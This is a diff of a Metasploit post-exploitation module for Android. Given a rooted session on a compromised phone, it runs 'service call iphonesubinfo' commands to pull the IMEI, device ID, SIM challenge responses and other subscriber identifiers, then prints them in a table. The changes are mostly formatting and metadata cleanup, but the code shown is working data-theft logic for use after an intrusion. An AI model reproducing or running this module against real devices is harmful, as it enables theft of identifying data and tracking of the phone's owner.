@@ -9,26 +9,30 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Android::Priv
   include Msf::Post::Android::System
 
-  def initialize(info={})
-    super( update_info( info, {
-        'Name'          => "extracts subscriber info from target device",
-        'Description'   => %q{
-            This module displays the subscriber info stored on the target phone.
-            It uses call service to get values of each transaction code like imei etc.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Extract Subscriber Info',
+        'Description' => %q{
+          This module displays the subscriber info stored on the target phone.
+          It uses call service to get values of each transaction code like IMEI, etc.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => ['Auxilus'],
-        'SessionTypes'  => [ 'meterpreter', 'shell' ],
-        'Platform'       => 'android',
-      }
-    ))
+        'License' => MSF_LICENSE,
+        'Author' => ['Auxilus'],
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Platform' => 'android',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
   end
 
   def run
-    unless is_root?
-      print_error("This module requires root permissions.")
-      return
-    end
+    fail_with(Failure::NoAccess, 'This module requires root permissions.') unless is_root?
 
     @transaction_codes ||= [
       'DeviceId',
@@ -61,19 +65,17 @@ class MetasploitModule < Msf::Post
       'IsimChallengeResponse',
       'IccSimChallengeResponse'
     ]
-    values ||= []
     arr ||= []
     for code in 1..@transaction_codes.length do
       print_status("using code : #{code}")
-      cmd = "service call iphonesubinfo #{code}"
-      block = cmd_exec(cmd)
-      value,tc = get_val(block, code)
+      block = cmd_exec("service call iphonesubinfo #{code}")
+      value, tc = get_val(block, code)
       arr << [tc, value]
     end
 
     tc_tbl = Rex::Text::Table.new(
-      'Header'  => 'Subscriber info',
-      'Indent'  => 1,
+      'Header' => 'Subscriber info',
+      'Indent' => 1,
       'Columns' => ['transaction code', 'value']
     )
 
@@ -91,15 +93,18 @@ class MetasploitModule < Msf::Post
     string = ''
     100.times do |i|
       next if i % 2 == 0
+
       str = parsed.split("'")[i]
       break if str.nil?
+
       string += str
     end
     v = ''
-    string.split(".").each do |chr|
-      next if chr.nil? or chr == "\n"
+    string.split('.').each do |chr|
+      next if chr.nil? || (chr == "\n")
+
       v += chr
     end
-    return v,@transaction_codes[code-1]
+    return v, @transaction_codes[code - 1]
   end
 end
